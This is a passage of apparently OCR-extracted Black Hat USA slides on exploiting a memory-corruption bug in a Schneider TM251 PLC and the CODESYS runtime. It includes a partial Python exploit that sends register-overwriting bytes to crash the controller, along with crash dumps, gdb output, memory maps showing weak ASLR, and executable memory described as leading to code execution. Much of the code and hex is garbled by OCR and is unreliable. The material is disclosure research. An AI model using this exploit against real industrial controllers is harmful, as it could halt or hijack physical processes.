## Slide 85

### Vuln to Exploit (Corruption)

### Exploit

|**R4**|**16000100**|
|---|---|
|R5|17000100|
|R6|18000100|
|R7|19000100|
|R8|1a000100|
|R9|1b000100|
|R10|1c000100|
|R11|1d000100|
|SP|1e000100|
|PC|1f000100|

#BHUSA  @BlackHatEvents

## Slide 86

### Exploit

### Vuln to Exploit (Corruption)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA 2&2 Vuln to Exploit (Corruption) a:
gl, Ll, al = dev.dev_channeLl.create_packet(DATA_SEND_REQUEST,
expLoit_bytes = BASIC_JUNK_WITH_SPESIFIC_REGISTERS_VALUES_OVERWRITING
AppLayer.add_tag(TAG_TRACE_PACKET_CREATE_13, exploit_bytes, AL_ALIGN48, al)
pkt = dev.dev_channel.compLlete_packet{gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
1f resp 1s None:
print('[>] GINDIL4: Killed the ple..")
else:
```

## Slide 87

### Exploit

### Vuln to Exploit (Corruption)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 73/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA 2&2 Vuln to Exploit (Corruption) a:
gl, Ll, al = dev.dev_channeLl.create_packet(DATA_SEND_REQUEST,
etmask=DEFAULT_NETMASK)
expLoit_bytes = BASIC_JUNK_WITH_SPESIFIC_REGISTERS_WALUES_OVERWRITING
AppLayer.add_tag(TAG_TRACE_PACKET_CREATE_13, exploit_bytes, AL_ALIGN4®, a1)
pkt = dev.dev_channel.compLlete_packet{gl, 11, al)
resp = dev.dev_channel.send(pkt, 5) J
1f resp 1s None: =
print('[>] GINDIL4: Killed the ple..")
else:
```

## Slide 88

### Exploit

### Vuln to Exploit (Corruption)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA 2&2 Vuln to Exploit (Corruption) a:
gl, Ll, al = dev.dev_channeLl.create_packet(DATA_SEND_REQUEST,
ALSUBCHD_TRACE_MANAGER_PACKET_CREATE,
etmask=DEFAULT_NETMASK)
expLoit_bytes = BASIC_JUNK_WITH_SPESIFIC_REGISTERS_WALUES_OVERWRITING
AppLayer.add_tag(TAG_TRACE_PACKET_CREATE_13, exploit_bytes, AL_ALIGN48, al),
pkt = dev.dev_channel.compLlete_packet{gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
1f resp 1s None:
print('[>] GINDIL4: Killed the ple..")
else:
```

## Slide 89

### Exploit

### Vuln to Exploit (Corruption)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA e&O0e Vuln to Exploit (Corruption) 7 ell sige
gl, Il, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST, BASIC_JUNK_WITH_SPESIFIC_REGISTERS_VALUES_OVERWRITING = bytearray([8x86, 6x81, 6x68,
8x80, 6x61, 6x68,
expLoit_bytes = BASIC_JUNK_WITH_SPESIFIC_REGISTERS_VALUES_OVERWRITI 6x68, , 6x66,
AppLayer.add_tag(TAG_TRACE_PACKET_CREATE_13, exploit_bytes, AL_ALIGN48, al) 6x68, , 6x66,
pkt = dev.dev_channel.complete_packet(gl, 11, al) 6x86, 6x66,
resp = dev.dev_channel.send(pkt, 5) 6x88, 6x66,
8x80, 8x88,
if resp is None: 6x66, 6x66,
print("[>] G1IND1L4: Killed the plc..") 6x66, 6x66,
else: 6x66, , 6x66,
print("[>] G1ND1L4: Its Alive!!!!!" 6x68, 6x66,
6x66, 6x66,
8x88, 8x88,
6x66, 6x66,
6x66, 6x68,
6x66, , 6x66,
6x66, 6x66,
8x88, 8x88,
6x66, 6x66, # R4
6x66, 6x66, # R6
8x88, 8x88, # R7
6x66, , 6x66, Bxla, # RB
6x66, 6x66, Oxlb, #R
8x68, 8x88, 8xib, # R10
8x80, 6x88, Gxib, # R11
6x66, 6x66, 6xlb, # SP
8x88, 8x88, 6x1b]) # PC
```

## Slide 90

Exploit

Vuln to Exploit (Corruption)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
osDate 24 2022 17:03:02"
A
7 sysErr
Exploit USA 2&0: Vuln to Exploit (Cig
skName
crDate
crTime
rl
r2 =
r4 69001608
mmuAdr
stack
```

## Slide 91

Exploit

Vuln to Exploit

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 76/100 on the text kept, 59/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit    Vuln[obscured]

[crash-dump screenshot; the left label column is covered by a photo of a woman celebrating in an office chair - covered text marked [obscured]]
# ST[obscured] CRASH #
[obscured] ="TM251MESE"
[obscured] "5.1.9.44"
[obscured] May 24 2022 17:03:02"
[obscured] DATA_ABT"
[obscured] x030503c0
[obscured] "BlkDrvShmM2XX"
[obscured] "28/12/1999"
[obscured] "23:46:44"
[obscured] =0x03296ed0
[obscured] =0x03296ed0
[obscured] 0x03296ed0
[obscured] 0x0000000c
[obscured] 0x16000100
[obscured] 0x17000100
[obscured] 0x18000100
[obscured] 0x19000100
[obscured] =0x1a000100
[obscured] =0x1b000100
[obscured] =0x1c000100
[obscured] =0x1d000100
r12     =0x00000000
r13     =0x03296e9c
r14     =0x03296e60
expAdr  =0x1f000100
cpsr    =0xa0000013
mmuAdr  =0xffffffdc
[obscured] =0x00000007
[obscured] =
[obscured]294db0]:                    9d482808 03a03596
```

## Slide 92

Exploit

What OS we run on ?

#BHUSA  @BlackHatEvents

## Slide 93

### Exploit

What we run on

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The RTOS
Exploit Mitigation
Blues
Jos Wetzels
```

## Slide 94

### Exploit

What we run on

<u>The RTOS Exploit Mitigation Blues Jos Wetzels (hardwear.io)</u>

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What we run on a:
The RTOS Exploit Mitigation Blues Jos Wetzels (hardwear.io)
The RTOS
Exploit Mitigation
Blues
Jos Wetzels
Mitigations
VxWorks
VxWorks
VxWorks
VxWorks
```

## Slide 95

### Exploit

What we run on

<u>The RTOS Exploit Mitigation Blues Jos Wetzels (hardwear.io)</u>

<u>URGENT/11 TCP/IP Stack Vulnerabilities (cynerio.com)</u>

#BHUSA  @BlackHatEvents

## Slide 96

Exploit

What we run on

<u>The RTOS Exploit Mitigation Blues Jos Wetzels (hardwear.io)</u>

<u>URGENT/11 TCP/IP Stack Vulnerabilities (cynerio.com)</u>

#BHUSA  @BlackHatEvents

## Slide 97

Exploit

What we run on

<u>The RTOS Exploit Mitigation Blues Jos Wetzels (hardwear.io)</u>

<u>URGENT/11 TCP/IP Stack Vulnerabilities (cynerio.com)</u>

#BHUSA  @BlackHatEvents

## Slide 98

Exploit

That easy ? NO (AKA You Shall Not Pass)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 49/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA &O
@2c89560]:
[ ]
[ ]
[ ]
[ ]
[ ]
[ ]
```

## Slide 99

Exploit

That easy ? NO (AKA You Shall Not Pass)

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 72/100 on the text kept, 39/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit    That easy ? NO (AKA You Shall Not Pass)

[panel 1]
stack   =
      [02c09520]: 02c0954c 02c09530 021e9930 021e96f0
      [02c09530]: 00000001 02c09560 02c09544 021e9930
      [02c09540]: 021e96f0 00000001 02c0959c 02c09750
      [02c09550]: 02990010 02c09588 02c09564 021e99d0
      [02c09560]: 0000000c ffffffff 02990010 02c095a0
      [02c09570]: 02c0957c 021dbd68 021db5e4 0000001c
      [02c09580]: 0298e010 02c095ac 02990010 00010924
      [02c09590]: 02950f40 02c095b8 02c095a4 02c09790   [line clipped at panel edge]

[panel 2]
stack   =
      [03294db0]:                   9d482808 03a03596
      [03294dc0]: 5ff787a5 90befffa e92de822 e3e7c69b
      [03294dd0]: 0a0da69e 79adf263 19b85be0 b58a4024
      [03294de0]: 00000000 02fc8988 02fc8b1c 00000084
      [03294df0]: 02fc8ff0 02fc8b40 00000084 03294eb4
      [03294e00]: 02fc8bc4 027805c8 0278060c 0292aeec
      [03294e10]: 0292af00 02911038 0000005c 55c45292
      [03294e20]: 01c04210 12835b01 42ea1169 3ac42e24
      [03294e30]: 00000000 02fc8aa8 4b037613 3da9a1a4
```

## Slide 100

Exploit

That easy ? NO (AKA You Shall Not Pass)

<u>URGENT/11 Vulnerabilities: Understanding Them and Protecting Systems (burnsmcd.com)</u>

#BHUSA  @BlackHatEvents

## Slide 101

Exploit

That easy ? NO (AKA You Shall Not Pass)

##### <u>URGENT/11 Vulnerabilities: Understanding Them and Protecting Systems (burnsmcd.com)</u>

#BHUSA  @BlackHatEvents

## Slide 102

Exploit

That easy ? NO (AKA You Shall Not Pass)

##### <u>URGENT/11 Vulnerabilities: Understanding Them and Protecting Systems (burnsmcd.com)</u>

#BHUSA  @BlackHatEvents

## Slide 103

Exploit

That easy ? NO (AKA You Shall Not Pass)

<u>URGENT/11 Vulnerabilities: Understanding Them and Protecting Systems (burnsmcd.com)</u>

#BHUSA  @BlackHatEvents

## Slide 104

Exploit

Weak ASLR Implementation On Schneider

### Power Save Options

#BHUSA  @BlackHatEvents

## Slide 105

Exploit

Weak ASLR Implementation On Schneider

### Power Save Options

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA ©COe
Power Save Options
# START CRASH #
osVersi ="5.1.9.35"
osDate ="Feb 2 2022 13:
3050718
tskName ="B1kDrvShmM2XX"
crTime P
re
8800013
mmuSta
9d482808 03203
```

## Slide 106

Exploit

Weak ASLR Implementation On Schneider

### Power Save Options

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 83/100 on the text kept, 70/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit    Weak ASLR Implementation On Schneider

Power Save Options

[left panel]
# START CRASH #
plcMdl  ="TM251MESE"
osVersi ="5.1.9.35"
osDate  ="Feb  2 2022 13:46:29"
sysErr  ="DATA_ABT"
tskNbr  =0x03050718
tskName ="BlkDrvShmM2XX"
crDate  ="07/01/2000"
crTime  ="02:26:33"
r0      =0x00000000
r1      =0x00000000
r2      =0x00000000
r3      =0x00000000
r4      =0x16000100
r5      =0x17000100
r6      =0x18000100
r7      =0x19000100
r8      =0x1a000100
r9      =0x1b000100
r10     =0x00000000
r11     =0x1d000100
r12     =0x00000000
r13     =0x1e000100
r14     =0x00000000
expAdr  =0x03296e58
cpsr    =0x60000013
mmuAdr  =0xfffffffc
mmuSta  =0x00000007
stack   =
      [03294db0]:                   9d482808 03a03596
      [03294dc0]: 5ff787a5 90befffa e92de822 e3e7c69b
      [03294dd0]: [line clipped at panel edge]

[right panel]
# START CRASH #
plcMdl  ="TM251MESE"
osVersi ="5.1.9.35"
osDate  ="Feb  2 2022 13:46:29"
sysErr  ="DATA_ABT"
tskNbr  =0x030506d0
tskName ="BlkDrvShmM2XX"
crDate  ="07/01/2000"
crTime  ="03:01:52"
r0      =0x00000000
r1      =0x00000000
r2      =0x00000000
r3      =0x00000000
r4      =0x22000100
r5      =0x23000100
r6      =0x24000100
r7      =0x25000100
r8      =0x26000100
r9      =0x27000100
r10     =0x00000000
r11     =0x29000100
r12     =0x00000000
r13     =0x2a000100
r14     =0x00000000
expAdr  =0x03296e8c
cpsr    =0x60000013
mmuAdr  =0xfffffffc
mmuSta  =0x00000007
stack   =
      [03294db0]:                   9d482808 03a03596
      [03294dc0]: 5ff787a5 90befffa e92de822 e3e7c69b
      [03294dd0]: [line clipped at panel edge]
```

## Slide 107

Exploit

Weak ASLR Implementation On Schneider

### Power Save Options

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit    Weak ASLR Implementation On Schneider

Power Save Options

[left panel; the "[03294db0]:" line is underlined in purple]
# START CRASH #
plcMdl  ="TM251MESE"
osVersi ="5.1.9.35"
osDate  ="Feb  2 2022 13:46:29"
sysErr  ="DATA_ABT"
tskNbr  =0x03050718
tskName ="BlkDrvShmM2XX"
crDate  ="07/01/2000"
crTime  ="02:26:33"
r0      =0x00000000
r1      =0x00000000
r2      =0x00000000
r3      =0x00000000
r4      =0x16000100
r5      =0x17000100
r6      =0x18000100
r7      =0x19000100
r8      =0x1a000100
r9      =0x1b000100
r10     =0x00000000
r11     =0x1d000100
r12     =0x00000000
r13     =0x1e000100
r14     =0x00000000
expAdr  =0x03296e58
cpsr    =0x60000013
mmuAdr  =0xfffffffc
mmuSta  =0x00000007
stack   =
      [03294db0]:                   9d482808 03a03596
      [03294dc0]: 5ff787a5 90befffa e92de822 e3e7c69b
      [03294dd0]: [line clipped at panel edge]

[right panel; the "[03294db0]:" line is underlined in purple]
# START CRASH #
plcMdl  ="TM251MESE"
osVersi ="5.1.9.35"
osDate  ="Feb  2 2022 13:46:29"
sysErr  ="DATA_ABT"
tskNbr  =0x030506d0
tskName ="BlkDrvShmM2XX"
crDate  ="07/01/2000"
crTime  ="03:01:52"
r0      =0x00000000
r1      =0x00000000
r2      =0x00000000
r3      =0x00000000
r4      =0x22000100
r5      =0x23000100
r6      =0x24000100
r7      =0x25000100
r8      =0x26000100
r9      =0x27000100
r10     =0x00000000
r11     =0x29000100
r12     =0x00000000
r13     =0x2a000100
r14     =0x00000000
expAdr  =0x03296e8c
cpsr    =0x60000013
mmuAdr  =0xfffffffc
mmuSta  =0x00000007
stack   =
      [03294db0]:                   9d482808 03a03596
      [03294dc0]: 5ff787a5 90befffa e92de822 e3e7c69b
      [03294dd0]: [line clipped at panel edge]
```

## Slide 108

Exploit

Weak ASLR Implementation On Schneider

### Power Save Options

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 66/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit    Weak ASLR Implementation On Schneider

Power Save Options

[left panel; the "[03294db0]:" line is underlined in purple]
# START CRASH #
plcMdl  ="TM251MESE"
osVersi ="5.1.9.35"
osDate  ="Feb  2 2022 13:46:29"
sysErr  ="DATA_ABT"
tskNbr  =0x03050718
tskName ="BlkDrvShmM2XX"
crDate  ="07/01/2000"
crTime  ="02:26:33"
r0      =0x00000000
r1      =0x00000000
r2      =0x00000000
r3      =0x00000000
r4      =0x16000100
r5      =0x17000100
r6      =0x18000100
r7      =0x19000100
r8      =0x1a000100
r9      =0x1b000100
r10     =0x00000000
r11     =0x1d000100
r12     =0x00000000
r13     =0x1e000100
r14     =0x00000000
expAdr  =0x03296e58
cpsr    =0x60000013
mmuAdr  =0xfffffffc
mmuSta  =0x00000007
stack   =
      [03294db0]:                   9d482808 03a03596
      [03294dc0]: 5ff787a5 90befffa e92de822 e3e7c69b
      [03294dd0]: [line clipped at panel edge]

[right panel; the "[03294db0]:" line is underlined in purple]
# START CRASH #
plcMdl  ="TM251MESE"
osVersi ="5.1.9.35"
osDate  ="Feb  2 2022 13:46:29"
sysErr  ="DATA_ABT"
tskNbr  =0x030506d0
tskName ="BlkDrvShmM2XX"
crDate  ="07/01/2000"
crTime  ="03:01:52"
r0      =0x00000000
r1      =0x00000000
r2      =0x00000000
r3      =0x00000000
r4      =0x22000100
r5      =0x23000100
r6      =0x24000100
r7      =0x25000100
r8      =0x26000100
r9      =0x27000100
r10     =0x00000000
r11     =0x29000100
r12     =0x00000000
r13     =0x2a000100
r14     =0x00000000
expAdr  =0x03296e8c
cpsr    =0x60000013
mmuAdr  =0xfffffffc
mmuSta  =0x00000007
stack   =
      [03294db0]:                   9d482808 03a03596
      [03294dc0]: 5ff787a5 90befffa e92de822 e3e7c69b
      [03294dd0]: [line clipped at panel edge]

[photo at right: a woman in a red suit pointing toward the two panels; no text]
```

## Slide 109

Exploit

### CODESYS Disable DEP By Design

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 74/100 on the text kept, 64/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
CODESYS Disable DEP By Design

root@PFC200-40E00B:~ cat /proc/`pidof codesys3`/maps
00010000-003ee000 r-xp 00000000 00:0e 8998        /usr/bin/codesys3
003fd000-003fe000 r--p 003dd000 00:0e 8998        /usr/bin/codesys3
003fe000-00406000 rw-p 003de000 00:0e 8998        /usr/bin/codesys3
00406000-004cd000 rw-p 00000000 00:00 0
02335000-024eb000 rw-p 00000000 00:00 0           [heap]
b23f0000-b23f1000 ---p 00000000 00:00 0
b23f1000-b24eb000 rwxp 00000000 00:00 0
b24eb000-b24ec000 ---p 00000000 00:00 0
b24ec000-b25e6000 rwxp 00000000 00:00 0
b25e6000-b25e7000 ---p 00000000 00:00 0
b25e7000-b26e1000 rwxp 00000000 00:00 0
b26e1000-b26e2000 ---p 00000000 00:00 0
b26e2000-b27dc000 rwxp 00000000 00:00 0
b27dc000-b27dd000 ---p 00000000 00:00 0
b27dd000-b28d7000 rwxp 00000000 00:00 0
b28d7000-b28d8000 ---p 00000000 00:00 0
b28d8000-b28f8000 rwxp 00000000 00:00 0
b28f8000-b28f9000 ---p 00000000 00:00 0
b28f9000-b2919000 rwxp 00000000 00:00 0
b2919000-b291a000 ---p 00000000 00:00 0
b291a000-b2a14000 rwxp 00000000 00:00 0
b2a14000-b2a15000 ---p 00000000 00:00 0
b2a15000-b2b0f000 rwxp 00000000 00:00 0
b2b0f000-b2b10000 ---p 00000000 00:00 0
b2b10000-b2c0a000 rwxp 00000000 00:00 0
b2c0a000-b2c0b000 ---p 00000000 00:00 0
b2c0b000-b2d05000 rwxp 00000000 00:00 0
b2d05000-b2d06000 ---p 00000000 00:00 0
b2d06000-b2e00000 rwxp 00000000 00:00 0
b2e00000-b2e22000 rw-p 00000000 00:00 0
b2e22000-b2f00000 ---p 00000000 00:00 0
b2f18000-b2f19000 ---p 00000000 00:00 0
b2f19000-b2f59000 rwxp 00000000 00:00 0
b2f59000-b2f5a000 ---p 00000000 00:00 0
b2f5a000-b2f7a000 rwxp 00000000 00:00 0
b2f7a000-b2f7b000 ---p 00000000 00:00 0
b2f7b000-b2f9b000 rwxp 00000000 00:00 0
b2f9b000-b2f9c000 ---p 00000000 00:00 0
b2f9c000-b2fbc000 rwxp 00000000 00:00 0
b2fbc000-b2fbd000 ---p 00000000 00:00 0
b2fbd000-b2fdd000 rwxp 00000000 00:00 0
b2fdd000-b2fde000 ---p 00000000 00:00 0
b2fde000-b2ffe000 rwxp 00000000 00:00 0
b2ffe000-b2fff000 ---p 00000000 00:00 0
b2fff000-b301f000 rwxp 00000000 00:00 0
b301f000-b3020000 ---p 00000000 00:00 0
b3020000-b3040000 rwxp 00000000 00:00 0
b3040000-b3041000 ---p 00000000 00:00 0
b3041000-b3061000 rwxp 00000000 00:00 0
```

## Slide 110

Exploit

CODESYS Disable DEP By Design

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA &O
A task is a time-based flow unit of an IEC program. You define a task with a name, a priority, and a type, which determines which condition triggers the start of the task. You can define this
condition either by time (cyclic-interval, freewheeling) or by the occurrence of an internal or external event to process the task. Examples of an event are the rising edge of a global project
variable or an interrupt event of the controller.
A task calls one or more program blocks (POUs). These programs can be application-specific (objects below the application in the device tree) or project-specific (objects available in the
POU window). In the case of a project-specific program, the application instances the project-global program. If CODESYS processes the task in the current cycle, then the programs are
executed for the duration of a c
```

## Slide 111

### Exploit

### CODESYS Disable DEP By Design

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 87/100 on the text kept, 63/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit    CODESYS Disable DEP By Design

Thread 32 hit Breakpoint 1, 0x00230638 in ?? ()
(gdb) info r
r0             0x0                 0
r1             0xb2fc1e38          3002867256
r2             0xb2fc1e3c          3002867260
r3             0x6c                108
r4             0xb2fc1e38          3002867256
r5             0xb2fc1be8          3002866664
r6             0xb2fc1be6          3002866662
r7             0x6eb0              28336
r8             0x4b1820            4921376
r9             0xb2fc1e68          3002867304
r10            0x17620             95776
r11            0xb2fc1e14          3002867220
r12            0xb2fc1be0          3002866656
sp             0xb2fc1dfc          0xb2fc1dfc
lr             0x230630            2295344
pc             0x230638            0x230638
cpsr           0x20010010          536936464
fpscr          0x10                16
(gdb)
```

## Slide 112

Exploit

### CODESYS Disable DEP By Design

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
CODESYS Disable DEP By Design

[left panel]
root@PFC200-40E00B:~ cat /proc/`pidof codesys3`/maps
00010000-003ee000 r-xp 00000000 00:0e 8998        /usr/bin/codesys3
003fd000-003fe000 r--p 003dd000 00:0e 8998        /usr/bin/codesys3
003fe000-00406000 rw-p 003de000 00:0e 8998        /usr/bin/codesys3
00406000-004cd000 rw-p 00000000 00:00 0
02335000-024eb000 rw-p 00000000 00:00 0           [heap]
b23f0000-b23f1000 ---p 00000000 00:00 0
b23f1000-b24eb000 rwxp 00000000 00:00 0
b24eb000-b24ec000 ---p 00000000 00:00 0
b24ec000-b25e6000 rwxp 00000000 00:00 0
b25e6000-b25e7000 ---p 00000000 00:00 0
b25e7000-b26e1000 rwxp 00000000 00:00 0
b26e1000-b26e2000 ---p 00000000 00:00 0
b26e2000-b27dc000 rwxp 00000000 00:00 0
b27dc000-b27dd000 ---p 00000000 00:00 0
b27dd000-b28d7000 rwxp 00000000 00:00 0
b28d7000-b28d8000 ---p 00000000 00:00 0
b28d8000-b28f8000 rwxp 00000000 00:00 0
b28f8000-b28f9000 ---p 00000000 00:00 0
b28f9000-b2919000 rwxp 00000000 00:00 0
b2919000-b291a000 ---p 00000000 00:00 0
b291a000-b2a14000 rwxp 00000000 00:00 0
b2a14000-b2a15000 ---p 00000000 00:00 0
b2a15000-b2b0f000 rwxp 00000000 00:00 0
b2b0f000-b2b10000 ---p 00000000 00:00 0
b2b10000-b2c0a000 rwxp 00000000 00:00 0
b2c0a000-b2c0b000 ---p 00000000 00:00 0
b2c0b000-b2d05000 rwxp 00000000 00:00 0
b2d05000-b2d06000 ---p 00000000 00:00 0
b2d06000-b2e00000 rwxp 00000000 00:00 0
b2e00000-b2e22000 rw-p 00000000 00:00 0
b2e22000-b2f00000 ---p 00000000 00:00 0
b2f18000-b2f19000 ---p 00000000 00:00 0
b2f19000-b2f59000 rwxp 00000000 00:00 0
b2f59000-b2f5a000 ---p 00000000 00:00 0
b2f5a000-b2f7a000 rwxp 00000000 00:00 0
b2f7a000-b2f7b000 ---p 00000000 00:00 0
b2f7b000-b2f9b000 rwxp 00000000 00:00 0
b2f9b000-b2f9c000 ---p 00000000 00:00 0
b2f9c000-b2fbc000 rwxp 00000000 00:00 0
b2fbc000-b2fbd000 ---p 00000000 00:00 0
b2fbd000-b2fdd000 rwxp 00000000 00:00 0
b2fdd000-b2fde000 ---p 00000000 00:00 0
b2fde000-b2ffe000 rwxp 00000000 00:00 0
b2ffe000-b2fff000 ---p 00000000 00:00 0
b2fff000-b301f000 rwxp 00000000 00:00 0
b301f000-b3020000 ---p 00000000 00:00 0
b3020000-b3040000 rwxp 00000000 00:00 0
b3040000-b3041000 ---p 00000000 00:00 0
b3041000-b3061000 rwxp 00000000 00:00 0

[right panel; a blue callout box around the "sp" row is joined by an arrow to a box around the "b2fbc000-b2fbd000" / "b2fbd000-b2fdd000" rows in the left panel]
Thread 32 hit Breakpoint 1, 0x00230638 in ?? ()
(gdb) info r
r0             0x0                 0
r1             0xb2fc1e38          3002867256
r2             0xb2fc1e3c          3002867260
r3             0x6c                108
r4             0xb2fc1e38          3002867256
r5             0xb2fc1be8          3002866664
r6             0xb2fc1be6          3002866662
r7             0x6eb0              28336
r8             0x4b1820            4921376
r9             0xb2fc1e68          3002867304
r10            0x17620             95776
r11            0xb2fc1e14          3002867220
r12            0xb2fc1be0          3002866656
sp             0xb2fc1dfc          0xb2fc1dfc
lr             0x230630            2295344
pc             0x230638            0x230638
cpsr           0x20010010          536936464
fpscr          0x10                16
(gdb)
```

## Slide 113

Exploit

### CODESYS Disable DEP By Design

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
root@PFC200-40E00B:~ cat /proc/*pidof codesys3*/maps
00406000-004cd000 rw-p 00000000 00:00
02335000-024eb000 rw-p 00000000 00:00
b23f0000-b23f1000 ---p 00000000 00:00
b23f1000-b24eb000 rwxp 00000000 00:00
b24eb000-b24ec000 ---p 00000000 00:00
bedecO00-b25e6000 rwxp 00000000 00:00
b25e6000-b25e7000 ---p 00000000 00:00
b2se7000-b26e1000 rwxp 00000000 00:00
b26e1000-b26e2000 ---p 00000000 00:00
b26e2000-b27dc0O00 rwxp 00000000 00:00
b27Tdc000-b27Tdd000 ---p 00000000 00:00
b2Tdd000-b2¢d7000 rwxp 00000000 00:00
b2edT000-b23d8000 ---p 00000000 00:00
b26d8000-b26f5000 rwxp 00000000 00:00
b2sfso00-b2sf9000 ---p 00000000 00:00
o
[heap]
b291a000-b2a14000 rwxp 00000000 o0:00
b2b0f000-b2b10000 ---p o0000000 G0:00 eak Hint 1, 0x00230638 in ?? ()
b2b10000-b2c0a000 rwxp ogg00000 o0:00
b2cOb000-b2d05000 rwxp 00000000 00:00 Oxb2 Me38 3002867256
b2d05000-b2d06000 ---p 00000000 00:00 @xb2;1 He3c 3002867260
b2f£5a000-b2£7a000 rwxp 90000000 o0:00 0x4b1620 4921376
b301E000-b3020000 ---p 00000000 00:00
b3020000-b3040000 rwxp 00000000 00:00
b3040000-b3041000 ---p 00000000 00:00
```

## Slide 114

### Exploit

CODESYS Disable DEP By Design (RCE)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 70/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
blackhat
Exploit USA ©COe
# START CRASH #
osDate
skNbr
tskName
crDate
crTime =
17000100
18000100
12000100
expAdr =0x03296e58
cpsr 60000013
mmuSta 002800007
stack =
```

## Slide 115

### Exploit

CODESYS Disable DEP By Design (RCE)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 55/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit USA &O
# START CRASH #
plcMd1 TM251MESE™
osDate b 2 2022 13:46:29"
sysE
tskNbr
tskName
crDate
crTime
r2
r3
r4
r7 x19808108
r8
r13
expAdr 3296e58
cpsr x60000013
mmuSta 080087
stack
[03296e00]:| 12000100 13000100 14900100 15000100
[@3296e10]:| 16000108 17000100 18000100 19000100
[03296e70]: 2000100 30000100 31000100 32000100
[03296e80]: 33000100 34000100 35000100 36000100
[@3296e90]:; 37000100 38000100 39000100 32000100
[@3296eb0]: 3000100 49000100 41000100 42000100
```

## Slide 116

### Exploit

CODESYS Disable DEP By Design (RCE)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 58/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit
# START CRASH #
plcMd1 TM251MESE"
osDate b 2 2022 13:46:29"
sysE
tskNbr
tskName
crDate
crTime
r2
r4
8000100
mmuSta 080087
stack
USA &
[03296e30]:
[
[
[
03296260]
80000118
82000100
86000100
12000100
16000100
87000100
13000100
17000100
04000100
08000100
10000100
14000100
18000100
33000100
37000100
30000100
34000100
38000100
490001008
29800180
2d000100
31000100
35000100
39800180
41000100
81800100
85000100
89800100
11000100
15000100
19800100
22000100
22000100
32000100
36000100
3a000100
42000100
#BHUSA
@BlackHatEvents
```

## Slide 117

### Exploit

### CODESYS Disable DEP By Design (RCE)

#BHUSA  @BlackHatEvents


